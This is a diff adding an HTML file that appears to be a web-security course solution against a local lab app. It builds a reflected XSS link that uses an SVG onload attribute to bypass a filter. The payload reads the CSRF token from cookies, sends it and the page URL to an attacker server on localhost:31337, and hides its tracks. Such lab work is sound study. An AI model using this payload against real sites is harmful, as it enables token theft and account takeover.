@@ -1,0 +1,60 @@
+<!--
+COLLABORATORS: N/A
+REFERENCES:
+- XSS Lecture Slides
+- https://stackoverflow.com/questions/44574894/how-to-start-script-in-html-without-script-tag
+- https://www.w3schools.com/graphics/svg_scripting.asp
+-->
+
+<html>
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+    function makeLink(csrfdefense, xssdefense, target, attacker) {
+        // Payload from previous task 3.1
+        var payloadStr = 
+            "$('html').hide();" +
+            "history.replaceState(null,'','http://localhost/project2/');" +
+            "function getCSRFToken(){" +
+            "var n='csrf=';" +
+            "var d=decodeURIComponent(document.cookie);" +
+            "var c=d.split(';');" +
+            "for(var i=0;i<c.length;i++){" +
+            "var x=c[i];" +
+            "while(x.charAt(0)==' '){x=x.substring(1)}" +
+            "if(x.indexOf(n)==0){return x.substring(n.length,x.length)}" +
+            "}" +
+            "return''}" +
+            "var token=getCSRFToken();" +
+            "$.get('" + attacker + "',{" +
+            "event:'page_load'," +
+            "uri:window.location.href," +
+            "csrf:token," +
+            "xssdefense:2," +
+            "csrfdefense:0" +
+            "});" +
+            "$('html').load('./',function(){$('html').show()});";
+        
+        // Use SVG to bypass the filter
+        var svgPayload = "<svg onload=\"" + payloadStr + "\">";
+        var encodedPayload = encodeURIComponent(svgPayload);
+        
+        return target + "./search?xssdefense=" + xssdefense.toString() +
+            "&csrfdefense=" + csrfdefense.toString() + "&q=" + encodedPayload;
+    }
+
+    var csrfdefense = 0;
+    var xssdefense = 2;
+    var target = "http://localhost/project2/";
+    var attacker = "http://localhost:31337/";
+    
+    $(function() {
+        var url = makeLink(csrfdefense, xssdefense, target, attacker);
+        $("h3").html("<a target=\"run\" href=\"" + url + "\">Task 3.2</a>");
+    });
+</script>
+
+<body class="link">
+    <h3></h3>
+</body>
+</html>
